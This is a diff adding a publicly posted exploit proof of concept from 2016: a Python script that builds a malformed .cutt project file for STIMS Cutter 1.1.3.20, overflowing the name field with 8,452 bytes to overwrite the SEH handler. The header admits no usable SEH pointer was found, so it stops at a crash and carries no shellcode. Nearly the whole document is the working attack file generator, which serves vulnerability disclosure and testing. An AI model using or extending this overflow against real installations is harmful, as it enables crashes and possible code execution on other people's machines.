@@ -1,0 +1,92 @@
+# Exploit Title: STIMS CUTTER OVERFLOW SEH OVERWRITE
+# Date: 19 Feb 2016
+# Exploit Author: Shantanu Khandelwal <shantanu561993@gmail.com
+<ishitasailor@gmail.com>>
+# Vendor Homepage: http://www.stimslabs.com/
+# Software Link: http://www.stimslabs.com/en/cutter/STIMSCutterEnSetup.exe
+# Version: 1.1.3.20
+# Tested on: Windows XP SP3
+# CVE : UNKNOWN
+# ==============HOW TO CRASH ==================
+#make the cutt file and open it it the STIMS Cutter application.
+#Click on Build Report
+#===========================================
+#Problems in exploitation
+#Unable to find suitable SEH pointer
+#
+
+
+#!/usr/bin/env python
+f=open("crash.cutt","w")
+
+payload = """<!--block:#solution-->
+[solution]
+name="""
+payload+="A"*8452
+payload +="BBBB" #SEH overwrite
+payload +="""CCCC
+desc=A
+time=0
+version=1
+file=C:\Documents and Settings\IEUser\Desktop\ABC.cutt
+time.created=131003117142810000
+app=1.1.3
+projects=1
+<!--#solution:block-->
+<!--block:A-->
+[properties]
+optimize=0
+level=0
+diversity=0
+status=0
+active=1
+remnants=0
+sort=0
+version=1
+desc=S
+comment=
+comment.active=0
+notes=
+notes.active=0
+material=A
+progress=100
+calculation=0D99FF12
+cost=222.000
+time.gone=0
+time.date=2016 Feb 18 23.29.14
+payload=2
+file=C:\Documents and Settings\IEUser\Desktop\ABC.cutt
+app=1.1.3
+
+[order.blanks]
+b001={ "uid": "908113387", "material": "A", "length": "222", "quantity":
+"1", "knife": "1", "indent": "11", "cost": "1.0", "comment": "1", "id":
+"1", "name": "a" }
+
+[order.pieces]
+p001={ "uid": "124270241", "material": "A", "length": "111", "quantity":
+"1", "label": "1", "comment": "1", "id": "1", "name": "a", "orphans": "0" }
+
+[layout.summary]
+summary={ "output": "112.000", "used.len": "222.000", "used": "1",
+"pieces": "1", "cmu": "50.450", "waste": "49.550", "shifts": "1",
+"remnants": "0.000", "srest": "110.000", "cost": "222.000", "cost.ppu":
+"1.982", "brest": "110.0", "status": "", "type": "summary", "time.gone":
+"0", "time.date": "2016 Feb 18 23.29.14" }
+blank01={ "name": "a", "cost": "1.000000", "blank": "1", "used": "1",
+"pieces": "1", "cmu": "50.450", "waste": "49.550", "shifts": "1", "output":
+"112.000", "used.len": "222.000", "cost.sum": "222.000", "cost.ppu":
+"1.982", "remnants": "0.000" }
+
+[layout.cuttings]
+c001={ "signature": "1#a1-", "copies": "1", "remains": "110", "blank": "1",
+"shifts": "1", "output": "#1 1", "layout": "111" }
+
+[layout.cuttings.parts]
+c001={ "signature": "1#a1-", "copies": "1", "remains": "110", "blank": "1",
+"shifts": "1", "output": "#1 1", "layout": "111", "name": "1" }
+<!--A:block-->
+"""
+
+f.write(payload)
+f.close()
